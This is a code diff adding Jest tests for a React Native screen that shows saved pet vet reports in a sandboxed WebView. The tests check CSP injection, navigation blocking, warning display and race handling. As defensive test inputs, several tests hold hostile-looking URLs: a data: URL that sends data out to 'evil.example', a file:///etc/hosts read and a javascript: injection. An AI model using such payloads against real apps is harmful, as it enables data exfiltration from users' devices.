@@ -2,7 +2,8 @@
 // that show nothing, whose report it is, and the one action that never reads as updating it.
 
 import React from 'react';
-import { render, fireEvent, waitFor } from '@testing-library/react-native';
+import { StyleSheet } from 'react-native';
+import { act, render, fireEvent, waitFor } from '@testing-library/react-native';
 
 const mockPush = jest.fn();
 let mockParams: { id?: string; pet?: string } = {};
@@ -52,7 +53,9 @@ jest.mock('../../lib/vetVisits', () => ({
   readVetVisitsHome: (...a: unknown[]) => mockHome(...a),
 }));
 
-import SavedReportScreen from './[id]';
+import SavedReportScreen, { savedCopyLoadAllowed } from './[id]';
+import { boxedPreviewHtml } from '../../components/reportV2/ReportPreviewV2';
+import { EXAM_CSP } from '../../lib/examRoom';
 
 const COOPER = { id: 'pet-cooper', name: 'Cooper' };
 const thisYear = new Date().getFullYear();
@@ -80,7 +83,7 @@ it('draws the stored copy as sent, locked, under its pet and date', async () => 
   const view = render(<SavedReportScreen />);
   await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
   const web = view.getByTestId('report-copy');
-  expect(web.props.source).toEqual({ html: '<html>as sent</html>' });
+  expect(web.props.source).toEqual({ html: boxedPreviewHtml('<html>as sent</html>') });
   expect(web.props.javaScriptEnabled).toBe(false);
   expect(web.props.incognito).toBe(true);
   expect(web.props.cacheEnabled).toBe(false);
@@ -229,5 +232,111 @@ describe('the send history', () => {
     await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
     expect(mockSends).not.toHaveBeenCalled();
     expect(view.queryByTestId('report-sends')).toBeNull();
+  });
+});
+
+describe('boxed in like the preview (CUL-2487)', () => {
+  it('every navigation reaches the load predicate, the page carries the room’s CSP, and no window opens', async () => {
+    mockOpen.mockResolvedValue({ kind: 'ok', html: '<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>' });
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
+    const web = view.getByTestId('report-copy');
+    // `['about:*', 'data:*']` handed a failing URL to the system browser, never to the predicate.
+    expect(web.props.originWhitelist).toEqual(['*']);
+    expect(web.props.source.html).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${EXAM_CSP}">`);
+    expect(typeof web.props.onOpenWindow).toBe('function');
+    for (const url of ['https://example.com/?d=record', 'nyx://reports', 'file:///etc/hosts', 'javascript:alert(1)']) {
+      expect(web.props.onShouldStartLoadWithRequest({ url })).toBe(false);
+    }
+    expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
+  });
+
+  it('every data: navigation is refused: the page can never hop to a document without the CSP (privacy pass 2)', async () => {
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
+    const web = view.getByTestId('report-copy');
+    const hop = 'data:text/html,<img src="https://evil.example/?d=';
+    expect(web.props.onShouldStartLoadWithRequest({ url: hop })).toBe(false);
+    expect(web.props.onShouldStartLoadWithRequest({ url: 'data:text/html;charset=utf-8,x' })).toBe(false);
+    // The copy's own document (iOS reports it as about:blank) still loads.
+    expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
+    expect(savedCopyLoadAllowed(hop)).toBe(false);
+    expect(savedCopyLoadAllowed('https://evil.example/')).toBe(false);
+    // No load-end gate to race.
+    expect(web.props.onLoadEnd).toBeUndefined();
+  });
+});
+
+describe('the bars never show without their warning (CUL-2467)', () => {
+  const line = 'Not a test of the diet alone. Overlapping the trial: Apoquel, overlapping it Oct 1 to Oct 20.';
+  const printed = (conf: string) => `<html><head></head><body><section class="leadchart" data-block="lead_chart"><svg></svg></section>${conf}</body></html>`;
+
+  it('a printed page with a confounder line pins that line, in full, above the page', async () => {
+    mockOpen.mockResolvedValue({ kind: 'ok', html: printed(`<p class="conf" data-block="confounder">${line}</p>`) });
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
+    const hidden = { includeHiddenElements: true };
+    const pin = view.getByTestId('report-copy-warning', hidden);
+    expect(view.getByText(line, hidden)).toBeTruthy();
+    // A repeat for the eye; a screen reader reaches the line in the page, in print order.
+    expect(pin.props.accessibilityElementsHidden).toBe(true);
+    expect(pin.props.importantForAccessibility).toBe('no-hide-descendants');
+    // A sibling above the page in the same column, never an overlay on it.
+    const json = JSON.stringify(view.toJSON());
+    expect(json.indexOf('"report-copy-warning"')).toBeGreaterThan(-1);
+    expect(json.indexOf('"report-copy-warning"')).toBeLessThan(json.indexOf('"report-copy"'));
+    expect(pin.props.style).not.toEqual(expect.objectContaining({ position: 'absolute' }));
+    // Never taller than the paper: it shrinks and scrolls rather than clip (adversarial pass 1).
+    expect(StyleSheet.flatten(pin.props.style)).toEqual(expect.objectContaining({ flexGrow: 0, flexShrink: 1 }));
+  });
+
+  it('a printed page with no confounder pins nothing', async () => {
+    mockOpen.mockResolvedValue({ kind: 'ok', html: printed('') });
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
+    expect(view.queryByTestId('report-copy-warning', { includeHiddenElements: true })).toBeNull();
+  });
+
+  it('a confounder whose line cannot be read back is not drawn at all: no bars without the pin', async () => {
+    mockOpen.mockResolvedValue({ kind: 'ok', html: printed(`<p data-block="confounder" class="conf">${line}</p>`) });
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
+    expect(view.queryByTestId('report-copy')).toBeNull();
+    expect(view.queryByTestId('report-copy-warning', { includeHiddenElements: true })).toBeNull();
+    expect(view.queryByTestId('report-as-sent')).toBeNull();
+    expect(view.queryByText('Try again')).toBeNull();
+  });
+});
+
+describe('the main read: one copy at a time (CUL-2477)', () => {
+  it('a params change clears the previous copy’s row, so a failed read never keeps its pet’s name', async () => {
+    const view = render(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByText('Cooper · Oct 30 report')).toBeTruthy());
+    mockParams = { id: 'r2', pet: 'pet-mira' };
+    mockReadOne.mockResolvedValue('failed');
+    mockOpen.mockResolvedValue({ kind: 'failed' });
+    view.rerender(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByTestId('report-failed')).toBeTruthy());
+    expect(view.queryByText(/Cooper/)).toBeNull();
+    expect(view.getByText('Saved report')).toBeTruthy();
+  });
+
+  it('a late answer for an earlier copy never lands on this one', async () => {
+    let releaseOld: (v: unknown) => void = () => undefined;
+    mockReadOne.mockImplementationOnce(() => new Promise((res) => { releaseOld = res; }));
+    mockOpen.mockImplementationOnce(() => Promise.resolve({ kind: 'ok', html: '<html>cooper</html>' }));
+    const view = render(<SavedReportScreen />);
+    mockParams = { id: 'r2', pet: 'pet-mira' };
+    const MIRA_ROW = { ...ROW, id: 'r2', petId: 'pet-mira' };
+    mockReadOne.mockResolvedValue(MIRA_ROW);
+    mockOpen.mockResolvedValue({ kind: 'ok', html: '<html>mira</html>' });
+    view.rerender(<SavedReportScreen />);
+    await waitFor(() => expect(view.getByText('Mira · Oct 30 report')).toBeTruthy());
+    await act(async () => {
+      releaseOld(ROW);
+    });
+    expect(view.getByText('Mira · Oct 30 report')).toBeTruthy();
+    expect(view.queryByText(/Cooper/)).toBeNull();
+    expect(view.getByTestId('report-copy').props.source).toEqual({ html: boxedPreviewHtml('<html>mira</html>') });
   });
 });
